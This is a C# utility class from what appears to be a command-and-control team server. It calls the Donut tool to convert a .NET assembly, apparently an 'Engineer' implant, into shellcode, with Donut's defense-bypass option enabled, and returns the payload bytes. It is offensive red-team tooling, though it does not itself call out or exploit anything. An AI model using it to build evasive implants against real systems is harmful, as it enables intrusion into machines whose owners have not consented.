using Donut;
using Donut.Structs;
using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace TeamServer.Utilities
{
    public static class Shellcode
    {
        public static byte[] AssemToShellcode(string filePath, string arguments)
        {
            char allPlatformPathSeperator = Path.DirectorySeparatorChar;
            // find the Engineer cs file and load it to a string so we can update it and then run the compiler function on it
            string path = Path.GetDirectoryName(Assembly.GetExecutingAssembly().Location);
            //split path at bin keyword
            string[] pathSplit = path.Split("bin"); //[0] is the parent folder [1] is the bin folder
            //update each string in the array to replace \\ with the correct path seperator
            pathSplit[0] = pathSplit[0].Replace("\\", allPlatformPathSeperator.ToString());
            string tempFolder = pathSplit[0] + "temp";
            
            // remove the leading space and add " to front and end of arguments
            arguments = arguments.TrimStart(' ');
            filePath = filePath.TrimStart(' ');
          
            // DonutConfig config = new DonutConfig();
            // config.Arch = 3;
            // config.Bypass = 3;
            // config.InputFile = @$"{filePath}";
            // config.Args = arguments;
            // config.Payload = $"{tempFolder}{allPlatformPathSeperator}payload.bin";
            // int ret = Generator.Donut_Create(ref config);
            // Console.WriteLine(Helper.GetError(ret));
            // byte[] shellcode = File.ReadAllBytes($"{config.Payload}");
            // return shellcode;
            
            Process donut = new Process();
            donut.StartInfo.FileName = @"D:\Share between vms\Donut_windows\donut.exe";
            donut.StartInfo.Arguments = $" -x 2 -a 3 -b 3 -o {tempFolder}{allPlatformPathSeperator}payload.bin -p {arguments} {filePath}";
            donut.StartInfo.UseShellExecute = false;
            donut.StartInfo.RedirectStandardOutput = true;
            donut.StartInfo.RedirectStandardError = true;
            
            //redirect output to console
            donut.OutputDataReceived += (sender, args) => Console.WriteLine(args.Data);
            
            donut.Start();
            donut.WaitForExit();
            // string output = donut.StandardOutput.ReadToEnd();
            // string error = donut.StandardError.ReadToEnd();
            // Console.WriteLine(output);
            // Console.WriteLine(error);
            byte[] shellcode = File.ReadAllBytes($"{tempFolder}{allPlatformPathSeperator}payload.bin");
            return shellcode;
            
        }
    }
}
